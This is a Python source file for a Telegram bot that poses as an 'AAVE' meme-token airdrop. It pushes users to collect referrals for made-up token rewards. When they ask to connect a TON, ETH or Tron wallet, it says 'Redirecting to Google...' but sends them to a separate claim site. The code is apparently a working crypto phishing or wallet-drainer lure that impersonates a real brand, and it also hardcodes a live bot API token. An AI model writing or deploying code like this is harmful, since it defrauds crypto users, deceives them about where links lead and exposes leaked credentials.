from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_referred_users
import logging

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username

    logger.info(f"User {user_id} started the bot with username: {username}")

    add_or_update_user(user_id, username)

    referrals = get_user_data(user_id)['referrals']
    logger.info(f"User {user_id} has {referrals} referrals.")

    keyboard = [
        [InlineKeyboardButton("Launch App", web_app=WebAppInfo(url="https://aavebot-html.vercel.app/"))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"AAVE is here! Your simple and fun Telegram meme token.\n\nGet started with our AAVE Telegram mini app to farm points and unlock exciting rewards. 🎁\n\nGot friends? Invite them and earn even more! 🌱\n\nDon’t miss out—AAVE is where your crypto journey grows! 🌟",
        reply_markup=reply_markup
    )
    logger.info(f"Sent welcome message to user {user_id}.")

# Function to handle WebApp data sent from the frontend
async def webapp_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.web_app_data:
        user_id = update.effective_user.id
        data = update.message.web_app_data.data

        logger.info(f"User {user_id} sent WebApp data: {data}")

        if data == 'generate_referral':
            username = update.effective_user.username or str(user_id)
            referral_link = f"https://t.me/AAVEclaim_bot?start=referral_{username}"

            # Send referral link to the user
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Your referral link is: {referral_link}"
            )
            logger.info(f"Sent referral link to user {user_id}: {referral_link}")

            # Retrieve referred users and send them
            referred_users = get_referred_users(user_id)
            referred_users_list = "\n".join([f"- {user}" for user in referred_users]) or "No referred users yet."
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Referred Users:\n{referred_users_list}"
            )
            logger.info(f"Sent referred users list to user {user_id}")

        elif data == 'check_wallet':
            user_data = get_user_data(user_id)
            referrals = user_data['referrals']
            balance = referrals * 22  # Assume each referral gives 22 tokens
            if referrals >= 5:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"You have {balance} $AAVE tokens.")
                logger.info(f"User {user_id} has enough referrals: {referrals}. Balance: {balance}.")
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="You need at least 5 referrals to unlock rewards.")
                logger.info(f"User {user_id} does not have enough referrals: {referrals}.")

# Function to handle connect button clicks
async def connect_buttons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.text:
        text = update.message.text.lower()

        if "connect ton" in text or "connect eth" in text or "connect tron" in text:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Redirecting to Google...")
            await context.bot.send_message(chat_id=update.effective_chat.id, text="https://aavetoks-claim.site")
            logger.info(f"User {update.effective_user.id} clicked connect button.")

    else:
        logger.warning(f"No message text found in the update: {update}")

# Function to log unhandled messages
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"Unhandled message received: {update}")

# Main function to start the bot
def main():
    application = ApplicationBuilder().token("7212377554:AAEQhO0o3djcL03N_vCtlwD48IBrLK-2yIg").build()

    init_db()

    # Add custom menu buttons
    application.bot.set_my_commands([
        BotCommand("launch", "Launch AAVE App")
    ])

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_data_handler))
    application.add_handler(MessageHandler(filters.Text, connect_buttons_handler))
    application.add_handler(MessageHandler(filters.ALL, message_handler))

    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
